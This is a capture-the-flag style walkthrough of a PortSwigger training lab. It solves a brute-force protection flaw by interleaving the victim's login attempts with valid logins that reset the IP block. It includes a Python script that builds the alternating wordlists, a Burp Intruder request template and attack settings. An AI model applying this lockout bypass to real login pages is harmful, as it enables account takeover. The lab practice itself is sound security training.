
# Lab: Broken brute-force protection, IP block

## Lab
This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: wiener:peter
- Victim's username: carlos
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Hint 
Advanced users may want to solve this lab by using a macro or the Turbo Intruder extension. However, it is possible to solve the lab without using these advanced features.

## Solution

To solve this lab, we have to login with carlos's password.

Lab gave us a account is `wiener:peter`

After fuzzing we know that application only allows login incorrect 3 times, after third login if we continue to login incorrect, our IP will be block. To unblock that IP we just login correct 1 time with the account was given by lab.

That's the idea to brute-force the password of victim `carlos`.
Frist step is make files containing username and password.
```Python
usrname = open('../shortlist/usernames.txt', 'r')
new_usrname = open('usernames.txt', 'w')
for word in usrname:
    new_usrname.write('carlos\n')
    new_usrname.write('wiener\n')

passwds = open('../shortlist/passwords.txt', 'r')
new_passwds = open('passwords.txt', 'w')
for word in passwds:
    new_passwds.write(word)
    new_passwds.write('peter\n')
```

Accessing the login page of application, login with any username and password to intercept this request in Burp Suite then send it to Intruder tab to modify the username and password are requested.

- clear the payload marker old
- add a new payload marker in username and password

like this:
```HTTP
POST /login HTTP/1.1
Host: 0a590000041e7158c14f2168000b0066.web-security-academy.net
Cookie: session=mJuSc6kg5gU1Y4gWZ1F6hHQDVIuQdF6C
Content-Length: 21
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a590000041e7158c14f2168000b0066.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a590000041e7158c14f2168000b0066.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=§a§&password=§a§
```

- Attack type is Pitchfork because each item in 2 payload set is aligned with each other.
- In payload set 1, payload type is simple list, then load file username was created above(`usernames.txt`).
- In payload set 2, payload type is simple list, then load file password was created above(`passwords.txt`).
- Then we create new resource pool with maximum current request is 1
- The last, in the Options tab we grep string `Your username is`

Start attack and check response in the `Your username is` column: which row returns 1 in `Your username is` column is the valid request. check in this request to take password of carlos.

Login application with `carlos:daniel` to solve this lab.